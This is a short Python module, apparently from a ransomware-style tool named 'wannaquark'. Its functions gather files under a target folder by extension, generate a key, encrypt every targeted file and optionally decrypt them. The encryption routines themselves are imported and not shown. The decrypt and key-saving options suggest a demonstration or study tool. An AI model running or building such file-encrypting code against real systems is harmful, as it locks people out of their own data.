from wannaquark.algorithm.encrypt import write_encrypt
from wannaquark.algorithm.decrypt import write_decrypt
from wannaquark.algorithm.targets import write_file_targets, get_targets
from wannaquark.algorithm.key_generator import write_file_key


def run_encryption(args):
    tuple_target_ext = ()
    write_targets, write_key = False, False

    if args.extension:
        tuple_target_ext = tuple(args.extension.split(","))
    if args.write_targets:
        write_targets = True
    if args.write_key:
        write_key = True

    # Get the list of all targeted files
    list_targets = write_file_targets(args.target, tuple_target_ext, serach_by='extension', write_targets=write_targets)
    # Create the encryption/decryption key
    key = write_file_key(write_key=write_key)
    # Encrypt all targeted documents
    write_encrypt(list_targets, key)

    if args.decrypt:
        # Decrypt all encrypted documents
        list_cry_files = get_targets(args.target, 'encrypted')
        write_decrypt(list_cry_files, key)


def run_decryption(args):
    # Decrypt all encrypted documents
    list_cry_files = get_targets(args.target, 'encrypted')
    write_decrypt(list_cry_files, args.key)
















